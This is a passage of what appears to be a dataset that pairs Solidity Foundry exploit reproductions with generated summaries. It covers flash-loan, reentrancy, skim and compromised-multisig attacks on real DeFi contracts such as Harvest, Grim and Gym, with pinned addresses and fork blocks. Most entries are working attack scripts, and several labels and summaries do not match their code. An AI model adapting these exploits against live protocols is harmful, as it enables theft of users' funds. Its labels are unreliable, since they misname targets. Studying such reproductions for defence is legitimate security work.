        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/Phalcon_xyz/status/1661424685320634368\n// @TX\n// https://explorer.phalcon.xyz/tx/bsc/0xb77cb34cd01204bdad930d8c172af12462eef58dea16199185b77147d6533391\n// @Summary\n// Token fee machenism broken\n\n\n\n\ncontract CSExp is Test, IDODOCallee {\n    IDPPOracle oracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);\n    IDPPOracle oracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);\n    IDPPOracle oracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);\n    IDPPOracle oracle4 = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);\n    IDPPOracle oracle5 = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);\n    \n    IPancakePair pair = IPancakePair(0x77a684943aA033e2E9330f12D4a1334986bCa3ef);\n    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n    \n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 GPT = IERC20(0xa1679abEF5Cd376cC9A1C4c2868Acf52e08ec1B3);\n    \n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28494868);\n        \n    }\n\n    function doFlashLoan(\n        IDPPOracle oracle\n    ) internal {\n        oracle.flashLoan(\n            0,\n            BUSD.balanceOf(address(oracle)),\n            address(this),\n            abi.encode(uint(0))\n        );\n    }\n\n    function testExp() external {\n        emit log_named_decimal_uint(\"[Start] Attacker BUSD Balance\", BUSD.balanceOf(address(this)), 18);\n        \n        doFlashLoan(oracle1);\n\n        emit log_named_decimal_uint(\"[End] Attacker BUSD Balance\", BUSD.balanceOf(address(this)), 18);\n    }\n\n    \n\n    function DPPFlashLoanCall(\n        address sender,\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        bytes calldata data\n    ) external {\n        if (msg.sender == address(oracle1)) {\n            doFlashLoan(oracle2);\n        } else if (msg.sender == address(oracle2)) {\n            doFlashLoan(oracle3);\n        } else if (msg.sender == address(oracle3)) {\n            doFlashLoan(oracle4);\n        } else if (msg.sender == address(oracle4)) {\n            doFlashLoan(oracle5);\n        } else {\n            // Start attack\n            pair.sync();\n            BUSD.approve(address(router), type(uint).max);\n             address[] memory path = new address[](2);\n            path[0] = address(BUSD);\n            path[1] = address(GPT);\n            router.swapExactTokensForTokens(\n                100_000 ether,\n                0,\n                path,\n                address(this),\n                block.timestamp + 100\n            );\n\n            GPT.approve(address(this), type(uint).max);\n            for (uint i = 0; i < 50; ++ i) {\n                GPT.transferFrom(address(this), address(pair), 0.5 ether);\n                pair.skim(address(this));\n            }\n\n            path[0] = address(GPT);\n            path[1] = address(BUSD);\n            uint outAmount = router.getAmountsOut(\n                GPT.balanceOf(address(this)),\n                path   \n            )[1 ];\n            GPT.transfer(address(pair), GPT.balanceOf(address(this)));\n            pair.swap(\n                outAmount,\n                0,\n                address(this),\n                bytes(\"\")\n            );\n        }\n\n        BUSD.transfer(msg.sender, quoteAmount);\n    }\n\n    receive() external payable {}\n    \n}\n\n\n",
        "summary": "This code is a Solidity contract that represents a vulnerability in a token fee mechanism. The contract imports several other contract interfaces and libraries such as \"Test.sol\", \"interface.sol\", and \"CheatCodes.sol\". Within the contract, there are several functions that interact with external smart contracts.\n\nThe main function \"testExp()\" calls the function \"doFlashLoan()\" on an instance of an IDPPOracle. This function performs a \"flash loan,\" which is essentially borrowing a large amount of an asset and then paying it back relatively quickly. After the flash loan, the contract performs a series of transactions on different oracles before finally executing an attack on a PancakeSwap pair.\n\nThe attack involves buying and selling GPT and BUSD tokens on the PancakeSwap platform, skimming small amounts of profit, and repeating the process up to 50 times. The attack is designed to exploit a weakness in the token fee mechanism, resulting in a substantial profit for the contract's owner.",
        "id": "f33649a1-eae2-4e73-9aca-f0b3648c2d02",
        "api_seq": "INUKO_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n    address btcAddress = 0x321162Cd933E2Be498Cd2267a90534A804051b11;\n    address wftmAddress = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;\n    address routerAddress = 0x16327E3FbDaCA3bcF7E38F5Af2599D2DDc33aE52;\n    address btc_wftm_address = 0x279b2c897737a50405ED2091694F225D83F2D3bA;  //Spirit LPs\n    address beethovenVaultAddress = 0x20dd72Ed959b6147912C2e529F0a0C651c33c9ce; //Flash Loan Pool\n    address grimBoostVaultAddress = 0x660184CE8AF80e0B1e5A1172A16168b15f4136bF;\n    IERC20 btc = IERC20(btcAddress);\n    IWFTM wftm = IWFTM(payable(wftmAddress));\n    IUniswapV2Router router = IUniswapV2Router(payable(routerAddress)); //SpiritSwap Router\n    IPancakePair btc_wftm = IPancakePair(btc_wftm_address);\n    IBeethovenVault beethovenVault = IBeethovenVault(beethovenVaultAddress);\n    IGrimBoostVault grimBoostVault = IGrimBoostVault(grimBoostVaultAddress);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    uint256 btcLoanAmount = 30*1e8;\n    uint256 wftmLoanAmount = 937830*1e18;\n    uint256 reentrancySteps = 7;\n    uint256 lpBalance;\n\n    function setUp() public {\n        cheats.createSelectFork(\"fantom\", 25345002); //fork fantom at block 25345002\n    }\n\n    function testExploit() public {\n        //Flash Loan WFTM and \"BTC\" frm BeethovenX\n        IERC20[] memory loanTokens = new IERC20[](2);\n        loanTokens[0] = wftm;\n        loanTokens[1] = btc;\n        uint256[] memory loanAmounts = new uint256[](2);\n        loanAmounts[0] = wftmLoanAmount;\n        loanAmounts[1] = btcLoanAmount;\n        beethovenVault.flashLoan(IFlashLoanRecipient(address(this)), loanTokens, loanAmounts, \"0x\");\n    }\n\n    // Called after receiving Flash Loan Funds\n    function receiveFlashLoan(IERC20[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) public{\n        // Add Liquidity to SpiritSwap\n        wftm.approve(routerAddress, wftmLoanAmount);\n        btc.approve(routerAddress, btcLoanAmount);\n        router.addLiquidity(btcAddress, wftmAddress, btcLoanAmount, wftmLoanAmount, 0, 0, address(this), block.timestamp);\n\n        // Call depositFor() in GrimBoostVault, reentrancy to this.transferFrom\n        btc_wftm.approve(grimBoostVaultAddress, 2**256-1);\n        lpBalance = btc_wftm.balanceOf(address(this));\n        grimBoostVault.depositFor(address(this), lpBalance, address(this));\n\n        // Withdraw LPs from GrimBoostVault\n        grimBoostVault.withdrawAll();\n\n        // Remove Liquidity from SpiritSwap\n        lpBalance = btc_wftm.balanceOf(address(this));\n        btc_wftm.transfer(btc_wftm_address, lpBalance);\n        btc_wftm.burn(address(this));\n\n        //Repay Flash Loan\n        for (uint256 i=0; i < tokens.length; ++i) {\n            IERC20 _token = tokens[i];\n            uint256 _amount = amounts[i];\n            uint256 _feeAmount = feeAmounts[i];\n            _token.transfer(beethovenVaultAddress, (_amount+_feeAmount));\n        }\n\n        emit log_named_uint(\n            \"WFTM attacker profit\",\n            wftm.balanceOf(address(this))/1e18\n        );\n\n        emit log_named_uint(\n            \"BTC attacker profit\",\n            btc.balanceOf(address(this))/1e8\n        );\n    }\n\n    // Called by the reentrancy vulnerability in grimBoostVault.depositFor()\n    function transferFrom(address _from, address _to, uint256 _value) public {\n        reentrancySteps -= 1;\n        if (reentrancySteps>0){\n            //Call depositFor() in GrimBoostVault with token==ATTACKER, user==ATTACKER\n            grimBoostVault.depositFor(address(this), lpBalance, address(this));\n        }else{\n            //In the last step on reentrancy call depositFor() with token==SPIRIT-LP, user==ATTACKER\n            grimBoostVault.depositFor(btc_wftm_address, lpBalance, address(this));\n        }\n    }\n}\n",
        "summary": "This code is a Solidity smart contract that tests an exploit on a DeFi platform. Specifically, it simulates an attack on the BeethovenX platform and exploits a reentrancy vulnerability in the GrimBoostVault contract. The attack involves flash borrowing WFTM and \"BTC\" (a mock Bitcoin token) from the BeethovenX flash loan pool, adding liquidity to the SpiritSwap DEX, depositing the resulting LP tokens in the GrimBoostVault, executing a reentrancy attack to withdraw the LP tokens multiple times, removing liquidity from SpiritSwap, and finally repaying the flash loan. The contract includes various addresses and amounts needed for the exploit to work, as well as interfaces to interact with external contracts. ",
        "id": "8c3f9d54-2a7c-4a64-adf7-04e22082766a",
        "api_seq": "NomadBridge.exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  IPancakeRouter pancakeRouter =\n    IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n  ILiquidityMigrationV2 liquidityMigrationV2 =\n    ILiquidityMigrationV2(payable(0x1BEfe6f3f0E8edd2D4D15Cae97BAEe01E51ea4A4));\n  IPancakePair wbnbBusdPair =\n    IPancakePair(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);\n  IPancakePair wbnbGymPair =\n    IPancakePair(0x8dC058bA568f7D992c60DE3427e7d6FC014491dB);\n  IPancakePair wbnbGymnetPair =\n    IPancakePair(0x627F27705c8C283194ee9A85709f7BD9E38A1663);\n  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n  IERC20 gym = IERC20(0xE98D920370d87617eb11476B41BF4BE4C556F3f8);\n  IERC20 gymnet = IERC20(0x3a0d9d7764FAE860A659eb96A500F1323b411e68);\n\n  constructor() {\n    cheat.createSelectFork(\n      \"bsc\",\n      16798806\n    ); //fork bsc at block 16798806\n\n    wbnb.approve(address(pancakeRouter), type(uint256).max);\n    gym.approve(address(pancakeRouter), type(uint256).max);\n    gymnet.approve(address(pancakeRouter), type(uint256).max);\n    wbnbGymPair.approve(address(pancakeRouter), type(uint256).max);\n    wbnbGymPair.approve(address(liquidityMigrationV2), type(uint256).max);\n    wbnbGymnetPair.approve(address(pancakeRouter), type(uint256).max);\n  }\n\n  function testExploit() public {\n    payable(address(0)).transfer(address(this).balance);\n    emit log_named_uint(\n      \"Before exploit, USDC  balance of attacker:\",\n      wbnb.balanceOf(msg.sender)\n    );\n    wbnbBusdPair.swap(2400e18, 0, address(this), new bytes(1));\n    emit log_named_uint(\n      \"After exploit, USDC  balance of attacker:\",\n      wbnb.balanceOf(msg.sender)\n    );\n  }\n\n  function pancakeCall(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n  ) public {\n    address[] memory path = new address[](2);\n    path[0] = address(wbnb);\n    path[1] = address(gym);\n    pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n      600e18,\n      0,\n      path,\n      address(this),\n      type(uint32).max\n    );\n    pancakeRouter.addLiquidity(\n      address(wbnb),\n      address(gym),\n      wbnb.balanceOf(address(this)),\n      gymnet.balanceOf(address(liquidityMigrationV2)),\n      0,\n      0,\n      address(this),\n      type(uint32).max\n    );\n    liquidityMigrationV2.migrate(wbnbGymPair.balanceOf(address(this)));\n    pancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(\n      address(gymnet),\n      wbnbGymnetPair.balanceOf(address(this)),\n      0,\n      0,\n      address(this),\n      type(uint32).max\n    );\n    wbnb.deposit{ value: address(this).balance }();\n    path[0] = address(gym);\n    path[1] = address(wbnb);\n    pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n      gym.balanceOf(address(this)),\n      0,\n      path,\n      address(this),\n      type(uint32).max\n    );\n    path[0] = address(gymnet);\n    pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n      gymnet.balanceOf(address(this)),\n      0,\n      path,\n      address(this),\n      type(uint32).max\n    );\n    wbnb.transfer(msg.sender, ((amount0 / 9975) * 10000) + 10000);\n    wbnb.transfer(tx.origin, wbnb.balanceOf(address(this)));\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This is a smart contract written in Solidity that implements a test in the context of the Pancakeswap decentralized exchange. The test is intended to exploit some vulnerability in the system, as its name suggests (function `testExploit`). Before doing so, the contract initializes some variables and authorizations and approves spendings of some tokens. In the `pancakeCall` function, some swaps and liquidity additions and removals are executed using the Pancakeswap router and some pairs, with the purpose of manipulating tokens and balances. The contract also includes some external interfaces (`CheatCodes`, `IPancakeRouter`, `ILiquidityMigrationV2`, `IPancakePair`, `IWBNB`, `IERC20`) that are used to interact with other smart contracts in the Pancakeswap system.",
        "id": "b2612bb6-e03f-4f75-8f9d-a8ab3bb6f8b9",
        "api_seq": "OrderStorage"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  IPancakeRouter pancakeRouter =\n    IPancakeRouter(payable(0x6CD71A07E72C514f5d511651F6808c6395353968));\n  GymToken gymnet = GymToken(0x3a0d9d7764FAE860A659eb96A500F1323b411e68);\n  GymSinglePool gympool =\n    GymSinglePool(0xA8987285E100A8b557F06A7889F79E0064b359f2);\n\n  function setUp() public {\n    cheat.createSelectFork(\n      \"bsc\",\n      18501049\n    ); //fork bsc at block 18501049\n  }\n\n  function testExploit() public {\n    gympool.depositFromOtherContract(\n      8000000000000000000000666,\n      0,\n      true,\n      address(this)\n    );\n    cheat.warp(1654683789);\n    gympool.withdraw(0);\n    emit log_named_uint(\n      \"Exploit completed, GYMNET balance of attacker:\",\n      gymnet.balanceOf(address(this))\n    );\n  }\n}\n",
        "summary": "This is a Solidity smart contract that tests the exploit of a potential vulnerability in the contract 'GymSinglePool'. The contract imports two other contracts, 'CheatCodes' and 'IPancakeRouter', and a token contract 'GymToken'. It then defines variables for instances of these contracts. In the function 'setUp()', the smart contract sets up a fork of the Binance Smart Chain at block 18501049. In the function 'testExploit()', the smart contract deposits 800,000 GYMNET tokens to 'GymSinglePool' and calls the 'warp()' function from the 'CheatCodes' contract to change the block timestamp. The smart contract then withdraws the deposited tokens and emits a log message that displays the balance of the attacker's address.",
        "id": "16a749d5-52bb-4c2a-a69f-0ee3f22f0f70",
        "api_seq": "Orion_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1529084919976034304\n// @Contract address\n// https://bscscan.com/address/0x94e06c77b02ade8341489ab9a23451f68c13ec1c#code\n\ncontract ContractTest is DSTest{\n    IERC20 HackDao = IERC20(0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2); // HackDao WBNB\n    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225); //HackDao USDT\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 18073756);\n    }\n\n    function testExploit() public{\n        WBNB.approve(address(Router), type(uint).max);\n        HackDao.approve(address(Router), type(uint).max);\n        DVM(dodo).flashLoan(1_900 * 1e18, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public{\n        // get HackDao\n        buyHackDao();\n        // call skim() to burn HackDao in lp\n        HackDao.transfer(address(Pair1), HackDao.balanceOf(address(this)));\n        Pair1.skim(address(Pair2));\n        Pair1.sync();\n        Pair2.skim(address(Pair1));\n        // sell HackDao\n        (uint reserve0, uint reserve1, ) = Pair1.getReserves(); // HackDao WBNB\n        uint amountAfter = HackDao.balanceOf(address(Pair1));\n        uint amountin = amountAfter - reserve0;\n        uint amountout = amountin * 9975 * reserve1 / (reserve0 * 10000 + amountin * 9975);\n        Pair1.swap(0, amountout, address(this), \"\");\n        WBNB.transfer(dodo, 1_900 * 1e18);\n    }\n\n    function buyHackDao() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(HackDao);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n}",
        "summary": "The code is a Solidity smart contract that defines a test function to exploit a vulnerability in a contract on the Binance Smart Chain (BSC). In the exploit, the attacker uses a flash loan from the DODO decentralized exchange (DEX) to manipulate the balance of two tokens, HackDao and WBNB, in a Uniswap V2 liquidity pool. The attacker then sells HackDao tokens for a profit and transfers the WBNB to the DODO flash loan contract to pay back the loan. The contract imports and uses several interfaces, including Test.sol, IERC20, and Uni_Pair_V2. The contract also defines functions to set up the test environment and to facilitate the flash loan and token trades.",
        "id": "4fc0eb9e-f2a1-4545-ac67-b09b8dcc4185",
        "api_seq": "Paribus_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n  MultiSig MultiSigWallet =\n    MultiSig(payable(0x715CdDa5e9Ad30A0cEd14940F9997EE611496De6));\n\n  address[] public owner;\n\n  function setUp() public {\n    cheat.createSelectFork(\"mainnet\", 15012645); //fork mainnet at block 15012645\n  }\n\n  function testExploit() public {\n    emit log_named_uint(\n      \"USDT balance of attacker before Exploit\",\n      usdt.balanceOf(address(this))\n    );\n    // Mulsig Case of compromised private key.\n    emit log_named_uint(\n      \"How many approval required:\",\n      MultiSigWallet.required()\n    );\n    cheat.prank(0xf845A7ee8477AD1FB4446651E548901a2635A915);\n    // TxHash: https://etherscan.io/tx/0x27981c7289c372e601c9475e5b5466310be18ed10b59d1ac840145f6e7804c97\n    bytes memory msgP1 = hex\"fe7f61ea000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000000000913e1f5a200000000000000000000000000\";\n    bytes memory recipient = abi.encodePacked(address(this));\n    bytes memory receiptId = hex\"d48d952695ede26c0ac11a6028ab1be6059e9d104b55208931a84e99ef5479b6\";\n    bytes memory _message = bytes.concat(msgP1, recipient, receiptId);\n    uint256 txId = MultiSigWallet.submitTransaction(\n      0x2dCCDB493827E15a5dC8f8b72147E6c4A5620857, // destination\n      0, // value\n      _message\n      // unlockToken(address,uint256,address,bytes32)\n      // ethToken: dac17f958d2ee523a2206206994597c13d831ec7\n      // amount: 9981000000000\n      // recipient: b4c79dab8f259c7aee6e5b2aa729821864227e84\n      // receiptId: d48d952695ede26c0ac11a6028ab1be6059e9d104b55208931a84e99ef5479b6 \n    ); \n    emit log_named_address(\n      \"2 of 5 multisig wallet, transaction first signed by:\",\n      MultiSigWallet.getConfirmations(txId)[0]\n    );\n    cheat.prank(0x812d8622C6F3c45959439e7ede3C580dA06f8f25);\n    MultiSigWallet.confirmTransaction(txId); // Transfer 9,981,000 USDT to address(this)\n    emit log_named_address(\n      \"2 of 5 multisig wallet, transaction second signed by:\",\n      MultiSigWallet.getConfirmations(txId)[1]\n    );\n    emit log_named_uint(\n      \"USDT balance of attacker after Exploit\",\n      usdt.balanceOf(address(this))\n    );\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This code defines a Solidity smart contract that imports two other contracts. It creates an instance of a contract called `CheatCodes` and a contract that implements an interface called `IERC20`. It defines a function called `setUp()` that forks the Ethereum Mainnet at a particular block number. It also defines a function called `testExploit()` that logs an attacker's USDT balance before a potential exploit, simulates a compromised private key of a multisig wallet, creates a transaction to transfer USDT tokens to the attacker's address, and logs the transaction and the attacker's new USDT balance after the exploit. Finally, it creates a `receive()` function that can receive ETH payments.",
        "id": "024717dd-88b2-4783-884d-8040ddfe3d5e",
        "api_seq": "PaymentSplit"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  // CONTRACTS\n  // Uniswap ETH/USDC LP (UNI-V2)\n  IUniswapV2Pair usdcPair =\n    IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);\n  // Uniswap ETH/USDT LP (UNI-V2)\n  IUniswapV2Pair usdtPair =\n    IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);\n  // Curve y swap\n  IcurveYSwap curveYSwap =\n    IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);\n  // Harvest USDC pool\n  IHarvestUsdcVault harvest =\n    IHarvestUsdcVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);\n\n  // ERC20s\n  // 6 decimals on usdt\n  IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n  // 6 decimals on usdc\n  IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n  // 6 decimals on yusdc\n  IERC20 yusdc = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);\n  // 6 decimals on yusdt\n  IERC20 yusdt = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);\n  // 6 decimals on fUSDT\n  IERC20 fusdt = IERC20(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);\n  // 6 decimals on fUSDC\n  IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);\n\n  uint256 usdcLoan = 50000000 * 10**6;\n  uint256 usdcRepayment = (usdcLoan * 100301) / 100000;\n  uint256 usdtLoan = 17300000 * 10**6;\n  uint256 usdtRepayment = (usdtLoan * 100301) / 100000;\n  uint256 usdcBal;\n  uint256 usdtBal;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 11129473); //fork mainnet at block 11129473\n  }\n\n  function testExploit() public {\n    usdt.approve(address(curveYSwap), type(uint256).max);\n    usdc.approve(address(curveYSwap), type(uint256).max);\n    usdc.approve(address(harvest), type(uint256).max);\n    usdt.approve(address(usdtPair), type(uint256).max);\n    usdc.approve(address(usdcPair), type(uint256).max);\n    emit log_named_uint(\n      \"Before exploitation, USDC balance of attacker:\",\n      usdc.balanceOf(address(this)) / 1e6\n    );\n    emit log_named_uint(\n      \"Before exploitation, USDT balance of attacker:\",\n      usdt.balanceOf(address(this)) / 1e6\n    );\n    usdcPair.swap(usdcLoan, 0, address(this), \"0x\");\n\n    emit log_named_uint(\n      \"After exploitation, USDC balance of attacker:\",\n      usdc.balanceOf(address(this)) / 1e6\n    );\n    emit log_named_uint(\n      \"After exploitation, USDT balance of attacker:\",\n      usdt.balanceOf(address(this)) / 1e6\n    );\n  }\n\n  function uniswapV2Call(\n    address,\n    uint256,\n    uint256,\n    bytes calldata\n  ) external {\n    if (msg.sender == address(usdcPair)) {\n      emit log_named_uint(\n        \"Flashloan, Amount of USDC received:\",\n        usdc.balanceOf(address(this)) / 1e6\n      );\n      usdtPair.swap(0, usdtLoan, address(this), \"0x\");\n      bool usdcSuccess = usdc.transfer(address(usdcPair), usdcRepayment);\n    }\n\n    if (msg.sender == address(usdtPair)) {\n      emit log_named_uint(\n        \"Flashloan, Amount of USDT received:\",\n        usdt.balanceOf(address(this)) / 1e6\n      );\n      for (uint256 i = 0; i < 6; i++) {\n        theSwap(i);\n      }\n      usdt.transfer(msg.sender, usdtRepayment);\n    }\n  }\n\n  function theSwap(uint256 i) internal {\n    curveYSwap.exchange_underlying(2, 1, 17200000 * 10**6, 17000000 * 10**6);\n    harvest.deposit(49000000000000);\n    curveYSwap.exchange_underlying(1, 2, 17310000 * 10**6, 17000000 * 10**6);\n    harvest.withdraw(fusdc.balanceOf(address(this)));\n    emit log_named_uint(\n      \"After swap, USDC balance of attacker:\",\n      usdc.balanceOf(address(this)) / 1e6\n    );\n    emit log_named_uint(\n      \"After swap ,USDT balance of attacker:\",\n      usdt.balanceOf(address(this)) / 1e6\n    );\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This is a Solidity smart contract that performs a flash loan attack on the Harvest Finance platform. The code imports several interfaces for different decentralized finance (DeFi) protocols such as Uniswap, Curve, and Harvest Finance. In the `testExploit` function, the contract first approves the transfer of ERC20 tokens between different protocols, then swaps USDC for a flashloan using the `usdcPair.swap` function and swaps it for USDT. Finally, the contract performs a series of transactions on the Curve protocol and Harvest Finance to manipulate the token prices and maximize profits. This attack allows the attacker to borrow funds and use them to manipulate the market to profit without any prior investment.",
        "id": "cd44c91e-12d3-46c2-852d-d9ad0a4a1fd0",
        "api_seq": "SELLC_exp"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract Hash{\n    bytes32 _msg = keccak256(abi.encodePacked(\"0xAA\"));\n\n    // \u552f\u4e00\u6570\u5b57\u6807\u8bc6\n    function hash(\n        uint _num,\n        string memory _string,\n        address _addr\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(_num, _string, _addr));\n    }\n\n    // \u5f31\u6297\u78b0\u649e\u6027\n    function weak(\n        string memory string1\n    )public view returns (bool){\n        return keccak256(abi.encodePacked(string1)) == _msg;\n    }\n\n    // \u5f3a\u6297\u78b0\u649e\u6027\n    function strong(\n        string memory string1,\n        string memory string2\n    )public pure returns (bool){\n        return keccak256(abi.encodePacked(string1)) == keccak256(abi.encodePacked(string2));\n    }\n}\n",
        "summary": "This code defines a Solidity smart contract called Hash. The contract has three functions: \n\n1. The hash function takes in a uint, a string, and an address, and returns a keccak256 hash of the concatenated input values. This function can be used to generate a unique identifier for a given set of inputs.\n\n2. The weak function takes in a string and checks if its keccak256 hash matches a pre-defined hash value. This can be used to verify that a certain string was previously hashed.\n\n3. The strong function takes in two strings and compares their keccak256 hashes to see if they are identical. This can be used to compare the validity of two strings without exposing their contents. \n\nThe code also includes a license identifier in compliance with the MIT license.",
        "id": "e506d038-bc30-46ba-9fc0-7548d15ea051",
        "api_seq": "Strings"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1583073442433495040\n// TX\n// https://bscscan.com/tx/0xae8ca9dc8258ae32899fe641985739c3fa53ab1f603973ac74b424e165c66ccf\n\ncontract ContractTest is DSTest{\n    IERC20 HEALTH = IERC20(0x32B166e082993Af6598a89397E82e123ca44e74E);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0xF375709DbdE84D800642168c2e8bA751368e8D32);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address constant dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 22337425);\n    }\n\n    function testExploit() public{\n        WBNB.approve(address(Router), type(uint).max);\n        HEALTH.approve(address(Router), type(uint).max);\n        DVM(dodo).flashLoan(200 * 1e18, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n\n        WBNBToHEALTH();\n        for(uint i = 0; i < 600; i++){\n            HEALTH.transfer(address(this), 0);\n        }\n        HEALTHToWBNB();\n        WBNB.transfer(dodo, 200 * 1e18);\n    }\n\n    function WBNBToHEALTH() internal {\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(HEALTH);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function HEALTHToWBNB() internal {\n        address[] memory path = new address[](2);\n        path[0] = address(HEALTH);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            HEALTH.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            